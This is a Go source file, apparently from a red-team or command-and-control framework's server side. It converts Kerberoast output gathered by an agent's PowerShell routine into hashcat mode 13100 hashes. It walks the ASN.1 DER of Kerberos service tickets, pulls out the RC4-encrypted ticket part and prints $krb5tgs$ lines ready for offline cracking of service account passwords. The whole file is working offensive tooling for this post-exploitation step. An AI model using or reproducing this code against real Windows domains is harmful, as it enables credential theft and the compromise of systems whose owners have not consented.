package main

import (
	"encoding/hex"
	"fmt"
	"strings"
)

// Kerberoast result conversion: the agent's PowerShell kerberoast() emits one
// line per service ticket as "UPN\t<hex AP-REQ>". KerberosRequestorSecurityToken
// returns an AP-REQ whose encapsulated ticket's enc-part is encrypted with the
// target account's long-term key - exactly what hashcat mode 13100 (etype 23 /
// RC4-HMAC) cracks. This file walks the ASN.1 DER to pull out the ciphertext
// and re-emits industry-standard lines:
//
//	$krb5tgs$23$*user$realm$UPN*$checksum$edata2
//
// where checksum is the first 16 ciphertext bytes (the HMAC-MD5 checksum) and
// edata2 the remaining RC4 stream (nonce || DER enc-tkt-part || hmac). Tickets
// using other etypes (17/18/24...) are not 13100-crackable and degrade to the
// legacy "UPN:hex" format so no data is silently dropped.

// derElement is a single DER TLV at the head of buf.
type derElement struct {
	tag     byte
	content []byte
	rest    []byte
}

// derFirst decodes the first TLV of buf (definite lengths only).
func derFirst(buf []byte) (derElement, bool) {
	if len(buf) < 2 {
		return derElement{}, false
	}
	tag := buf[0]
	length, n, ok := derReadLength(buf[1:])
	if !ok {
		return derElement{}, false
	}
	end := 1 + n + length
	if end > len(buf) {
		return derElement{}, false
	}
	return derElement{tag: tag, content: buf[1+n : end], rest: buf[end:]}, true
}

// derReadLength decodes the length field starting at b (long form supported up
// to 4 bytes, matching ticket sizes).
func derReadLength(b []byte) (length int, n int, ok bool) {
	if len(b) == 0 {
		return 0, 0, false
	}
	first := b[0]
	if first&0x80 == 0 {
		return int(first), 1, true
	}
	num := int(first & 0x7f)
	if num == 0 || num > 4 || len(b) < 1+num {
		return 0, 0, false
	}
	length = 0
	for _, c := range b[1 : 1+num] {
		length = length<<8 | int(c)
	}
	return length, 1 + num, true
}

// findAPREQ locates the [APPLICATION 1] AP-REQ structure inside raw bytes.
// Cold-path tolerances: some .NET builds wrap GetRequest() output in SPNEGO
// (0x60 MechToken ...) - the scan descends into every constructed element until
// the first 0x61 tag is found, so both bare and SPNEGO-wrapped blobs work.
func findAPREQ(raw []byte) []byte {
	for {
		el, ok := derFirst(raw)
		if !ok {
			return nil
		}
		if el.tag == 0x61 {
			return el.content
		}
		if el.tag&0x20 != 0 {
			if nested := findAPREQ(el.content); nested != nil {
				return nested
			}
		}
		raw = el.rest
	}
}

// krbTicketCipher extracts the service ticket's enc-part (etype + ciphertext)
// from an AP-REQ DER blob:
//
//	AP-REQ  [APPLICATION 1] SEQUENCE { pvno[0], msg-type[1], ap-options[2],
//	                                     ticket[3], authenticator[4] }
//	Ticket  [APPLICATION 1] SEQUENCE { tkt-vno[0], realm[1], sname[2],
//	                                     enc-part[3] }
//	EncryptedData SEQUENCE  { etype[0], kvno[1], cipher[2] }
func krbTicketCipher(apreq []byte) (etype int, cipher []byte, ok bool) {
	content := findAPREQ(apreq)
	if content == nil {
		return 0, nil, false
	}
	content = skipRedundantSeq(content)
	var ticket []byte
	for rest := content; ; {
		el, elOk := derFirst(rest)
		if !elOk {
			break
		}
		if el.tag == 0xa3 {
			if t, tOk := derFirst(el.content); tOk && t.tag == 0x61 {
				ticket = skipRedundantSeq(t.content)
			}
			break
		}
		rest = el.rest
	}
	if ticket == nil {
		return 0, nil, false
	}
	for rest := ticket; ; {
		el, elOk := derFirst(rest)
		if !elOk {
			break
		}
		if el.tag == 0xa3 {
			for inner := skipRedundantSeq(el.content); ; {
				ie, ieOk := derFirst(inner)
				if !ieOk {
					break
				}
				switch ie.tag {
				case 0xa0:
					if v, vOk := derInt(ie.content); vOk {
						etype = v
					}
				case 0xa2:
					if oct, octOk := derFirst(ie.content); octOk && oct.tag == 0x04 {
						cipher = oct.content
					}
				}
				inner = ie.rest
			}
			break
		}
		rest = el.rest
	}
	if etype == 0 || len(cipher) == 0 {
		return 0, nil, false
	}
	return etype, cipher, true
}

// skipRedundantSeq unwraps one leading SEQUENCE element: RFC 4120 encodes
// [APPLICATION 1] structures with the SEQUENCE tag *replaced* by the
// application tag, but some toolchains emit an extra nested 0x30. Be tolerant
// of both.
func skipRedundantSeq(b []byte) []byte {
	if len(b) > 0 && b[0] == 0x30 {
		if seq, ok := derFirst(b); ok && seq.tag == 0x30 {
			return seq.content
		}
	}
	return b
}

// derInt extracts the value of an INTEGER element wrapped in a context tag.
func derInt(content []byte) (int, bool) {
	el, ok := derFirst(content)
	if !ok || el.tag != 0x02 {
		return 0, false
	}
	v := 0
	for _, b := range el.content {
		v = v<<8 | int(b)
	}
	return v, true
}

// convertKerberoastLine rewrites a single "UPN\t<hex>" line into hashcat 13100
// format when the ticket is RC4 (etype 23); everything else passes through
// unchanged (tab-lines without a crackable etype degrade to "UPN:hex" so the
// server ingest keeps working).
func convertKerberoastLine(line string) string {
	line = strings.TrimSpace(line)
	if line == "" {
		return ""
	}
	parts := strings.SplitN(line, "\t", 2)
	if len(parts) != 2 {
		return line
	}
	upn := strings.TrimSpace(parts[0])
	hexBlob := strings.TrimSpace(parts[1])
	if upn == "" || hexBlob == "" {
		return ""
	}
	raw, err := hex.DecodeString(hexBlob)
	if err != nil {
		return line
	}
	legacy := upn + ":" + hexBlob
	etype, cipher, ok := krbTicketCipher(raw)
	if !ok || etype != 23 {
		return legacy
	}
	if len(cipher) < 48 {
		return legacy
	}
	user, realm := upn, ""
	if at := strings.LastIndex(upn, "@"); at > 0 {
		user, realm = upn[:at], upn[at+1:]
	}
	checksum := cipher[:16]
	edata2 := cipher[16:]
	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
		user, realm, upn,
		strings.ToLower(hex.EncodeToString(checksum)),
		strings.ToLower(hex.EncodeToString(edata2)))
}

// convertKerberoastResult applies convertKerberoastLine to every line of the
// raw PowerShell output.
func convertKerberoastResult(raw string) string {
	lines := strings.Split(raw, "\n")
	changed := false
	for i, l := range lines {
		if c := convertKerberoastLine(l); c != "" {
			lines[i] = c
			changed = true
		}
	}
	if !changed {
		return raw
	}
	return strings.Join(lines, "\n")
}